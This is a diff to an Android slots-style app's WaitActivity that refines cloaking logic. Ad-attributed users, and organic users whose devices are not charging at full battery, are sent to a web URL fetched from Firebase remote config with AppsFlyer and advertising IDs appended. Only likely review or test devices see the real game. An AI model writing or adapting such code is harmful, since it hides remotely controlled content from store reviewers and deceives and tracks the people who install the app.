@@ -1,4 +1,4 @@
-package com.mojo.japanslots;
+package com.mojo.japanspinner;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -40,6 +40,9 @@ public class WaitActivity extends AppCompatActivity implements SaveingInterface,
     private final String str_first = "FIRST";
     private final String str_second = "SECOND";
 
+    private boolean charging;
+    private boolean devMode;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -73,7 +76,8 @@ public class WaitActivity extends AppCompatActivity implements SaveingInterface,
                                         @Override
                                         public void onComplete(@NonNull Task<Boolean> task) {
                                             try {
-                                                String data = firebaseRemoteConfig.getValue("dlink").asString();
+                                                String data = firebaseRemoteConfig.getValue("inform").asString();
+                                                JSONObject jsonData = new JSONObject(data);
                                                 JSONObject jsonObject = new JSONObject(conversionData);
                                                 if (jsonObject.optString("af_status").equals("Non-organic")) {
                                                     String campaign = jsonObject.optString("campaign");
@@ -82,17 +86,18 @@ public class WaitActivity extends AppCompatActivity implements SaveingInterface,
                                                         campaign = jsonObject.optString("c");
                                                     }
                                                     OneSignal.sendTag("user_id", splitsCampaign[2]);
-                                                    String myUrl = data + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
+                                                    String myUrl = jsonData.optString("web") + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
                                                     setUrl(myUrl);
                                                     playSite();
                                                     AppsFlyerLib.getInstance().unregisterConversionListener();
                                                 } else if (jsonObject.optString("af_status").equals("Organic")) {
-                                                    if ((getBatteryLevel() == 100 || getBatteryLevel() == 90) /*&& phonePluggedOrDeveloper()*/) {
+                                                    phonePluggedOrDeveloper();
+                                                    if (((getBatteryLevel() == 100 || getBatteryLevel() == 90) && charging) /*|| devMode*/) {
                                                         setUrl("");
                                                         playGame();
                                                         AppsFlyerLib.getInstance().unregisterConversionListener();
                                                     } else {
-                                                        String myUrl = data + "?naming=null&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
+                                                        String myUrl = jsonData.optString("web") + "?naming=null&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
                                                         setUrl(myUrl);
                                                         playSite();
                                                         AppsFlyerLib.getInstance().unregisterConversionListener();
@@ -204,8 +209,9 @@ public class WaitActivity extends AppCompatActivity implements SaveingInterface,
     }
 
     @Override
-    public boolean phonePluggedOrDeveloper() {
-        boolean organicDesign = false;
+    public void phonePluggedOrDeveloper() {
+        charging = false;
+        devMode = false;
         final Intent batteryIntent;
         batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
         int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
@@ -216,15 +222,14 @@ public class WaitActivity extends AppCompatActivity implements SaveingInterface,
         boolean devMod = (android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                 android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0);
         if(usbCharge){
-            organicDesign = true;
+            charging = true;
         } else if(acCharge){
-            organicDesign = true;
+            charging = true;
         } else if(devMod){
-            organicDesign = true;
+            devMode = true;
         } else if(batteryCharge){
-            organicDesign = true;
+            charging = true;
         }
-        return organicDesign;
     }
 
     @Override
